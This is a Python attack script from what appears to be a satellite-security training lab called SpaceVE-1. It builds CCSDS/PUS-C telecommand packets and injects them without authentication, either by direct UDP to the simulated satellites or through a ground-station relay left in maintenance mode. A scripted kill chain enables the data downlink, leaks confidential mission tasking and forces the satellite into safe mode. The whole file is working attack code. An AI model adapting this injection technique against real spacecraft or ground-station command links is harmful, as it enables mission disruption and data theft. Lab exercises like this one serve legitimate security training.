#!/usr/bin/env python3
"""
command_injector.py -- SpaceVE-1 Command Injection Tool
SpaceVE-1 Lab Attack Tool

Demonstrates 2 command injection attack vectors against SpaceVE-1:

  Vector 1: Direct UDP to satellite (bypasses ground station)
            Requires: run from inside Docker cmd network (192.168.61.0/24)
            or via a container with cmd network access.

  Vector 2: Ground station TCP relay via GS-BETA (MAINTENANCE_MODE, no auth)
            Requires: docker compose up — GS-BETA exposed on localhost:4820.

Usage:
  python3 command_injector.py --attack gs_relay
  python3 command_injector.py --attack gs_relay --cmd SAFING_MODE
  python3 command_injector.py --attack udp --ip 192.168.61.100
  python3 command_injector.py --attack chain

Common Beginner Mistakes:
  - Direct UDP only works from inside the Docker cmd network (192.168.61.0/24).
    From the host, use gs_relay (GS-BETA is exposed on localhost:4820).
  - GS-BETA is in maintenance mode so no password is needed.
  - Use the exact function names from LISTCMDS (uppercase).
"""

import argparse
import socket
import struct
import sys
import time

# From host: GS-BETA is exposed on localhost:4820
# From inside Docker cmd net: satellites are at 192.168.61.100/101/102
GS_BETA_HOST   = "localhost"
GS_BETA_PORT   = 4820
SAT_IPS = {
    "SpaceVE-1A": "192.168.61.100",
    "SpaceVE-1B": "192.168.61.101",
    "SpaceVE-1C": "192.168.61.102",
}
SAT_CMD_PORT   = 1234
SATELLITE_APID = 0x200

COMMANDS = {
    "NOP":                     0x00,
    "CAMERA_ON":               0x01,
    "CAMERA_OFF":              0x02,
    "DOWNLINK_ENABLE":         0x03,
    "DOWNLINK_DISABLE":        0x04,
    "MEMORY_DUMP":             0x05,
    "REBOOT":                  0x06,
    "SAFING_MODE":             0x07,
    "NOMINAL_MODE":            0x08,
    "MISSION_DOWNLINK_ENABLE": 0x0B,
    "MISSION_DOWNLINK_DISABLE":0x0C,
}

_seq = 0


def build_pus_tc(apid: int, fc: int) -> bytes:
    """Build PUS-C TC[128,1] (13 bytes) matching satellite validate_ccsds."""
    global _seq
    _seq = (_seq + 1) & 0x3FFF
    word0 = (1 << 12) | (1 << 11) | (apid & 0x7FF)
    word1 = (0b11 << 14) | _seq
    pus_ver_ack = 0x21
    hdr = struct.pack(">BBBH", pus_ver_ack, 128, 1, 0x0001)
    ck = 0xFF
    for b in hdr:
        ck ^= b
    ck ^= fc
    secondary = hdr + bytes([fc, ck])
    return struct.pack(">HHH", word0, word1, len(secondary) - 1) + secondary


def attack_udp(sat: str = "SpaceVE-1A", cmd: str = "DOWNLINK_ENABLE") -> bool:
    """
    Vector 1: direct UDP injection to satellite.
    Only works from inside Docker spacelab-cmd network (192.168.61.0/24).
    """
    fc  = COMMANDS.get(cmd.upper())
    if fc is None:
        print(f"  [UDP] Unknown command '{cmd}'. Use --list to see options.")
        return False
    ip  = SAT_IPS.get(sat)
    if not ip:
        print(f"  [UDP] Unknown satellite '{sat}'")
        return False
    pkt = build_pus_tc(SATELLITE_APID, fc)
    print(f"  [UDP] Sending '{cmd}' (FC=0x{fc:02X}) PUS-C TC -> {ip}:{SAT_CMD_PORT}")
    print(f"  [UDP] Packet ({len(pkt)} bytes): {pkt.hex()}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        sock.sendto(pkt, (ip, SAT_CMD_PORT))
        sock.close()
        print(f"  [UDP] Sent. No authentication required.")
        return True
    except Exception as e:
        print(f"  [UDP] Error: {e}")
        print(f"  [UDP] Note: direct UDP only reachable from inside Docker cmd network.")
        return False


def attack_gs_relay(sat: str = "SpaceVE-1A", cmd: str = "DOWNLINK_ENABLE") -> bool:
    """
    Vector 2: GS-BETA text protocol relay.
    GS-BETA runs in MAINTENANCE_MODE — no auth required (MC-GS-3).
    Exposed on localhost:4820.
    """
    print(f"  [GS]  Connecting to GS-BETA at {GS_BETA_HOST}:{GS_BETA_PORT}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((GS_BETA_HOST, GS_BETA_PORT))

        banner = sock.recv(512).decode("utf-8", errors="replace")
        if "MAINTENANCE" not in banner and "authentication" in banner.lower():
            print(f"  [GS]  Unexpected: auth required. Banner: {banner[:120]}")
            sock.close()
            return False

        line = f"SENDCMD {sat} {cmd.upper()}\n"
        print(f"  [GS]  Sending: {line.strip()}")
        sock.sendall(line.encode())
        resp = sock.recv(256).decode("utf-8", errors="replace").strip()
        sock.close()
        ok = resp.startswith("OK")
        print(f"  [GS]  Response: {resp}")
        if ok:
            print(f"  [GS]  Command relayed to satellite. No authentication was required.")
        return ok
    except ConnectionRefusedError:
        print(f"  [GS]  Connection refused. Is the lab running? (docker compose up -d)")
        return False
    except Exception as e:
        print(f"  [GS]  Error: {e}")
        return False


def attack_chain():
    """Full kill chain: GS-BETA -> DOWNLINK_ENABLE -> MISSION_DOWNLINK_ENABLE."""
    print("\n  === SpaceVE-1 Command Injection Chain ===\n")

    print("  [Step 1] Enable downlink via GS-BETA (maintenance mode, no auth)")
    ok = attack_gs_relay("SpaceVE-1A", "DOWNLINK_ENABLE")
    print()
    if not ok:
        print("  Chain aborted: could not reach GS-BETA.")
        return
    time.sleep(1)

    print("  [Step 2] Enable mission data downlink (leaks CONFIDENTIAL tasking)")
    attack_gs_relay("SpaceVE-1A", "MISSION_DOWNLINK_ENABLE")
    print()
    time.sleep(2)

    print("  [Step 3] Mission plan now flowing in WS TLM stream.")
    print("  Connect to dashboard: http://localhost:8080")
    print("  Or subscribe to ws://localhost:8765?token=<your_token>")
    print()

    print("  [Step 4] Put satellite into SAFE mode (mission impact)")
    attack_gs_relay("SpaceVE-1A", "SAFING_MODE")
    print()
    print("  === Chain complete ===\n")


def main():
    p = argparse.ArgumentParser(description="SpaceVE-1 command injection tool")
    p.add_argument("--attack", choices=["udp", "gs_relay", "chain", "list"],
                   default="chain")
    p.add_argument("--sat", default="SpaceVE-1A",
                   choices=list(SAT_IPS.keys()),
                   help="Target satellite")
    p.add_argument("--cmd", default="DOWNLINK_ENABLE",
                   help="Command name (use --attack list to see all)")
    p.add_argument("--ip", default=None,
                   help="Satellite IP for UDP mode (default: auto from --sat)")
    args = p.parse_args()

    if args.attack == "list":
        print("\n  Available commands:")
        for name, fc in COMMANDS.items():
            print(f"    {name:<30} FC=0x{fc:02X}")
        print()
    elif args.attack == "udp":
        print()
        if args.ip:
            SAT_IPS[args.sat] = args.ip
        attack_udp(args.sat, args.cmd)
    elif args.attack == "gs_relay":
        print()
        attack_gs_relay(args.sat, args.cmd)
    elif args.attack == "chain":
        attack_chain()


if __name__ == "__main__":
    main()
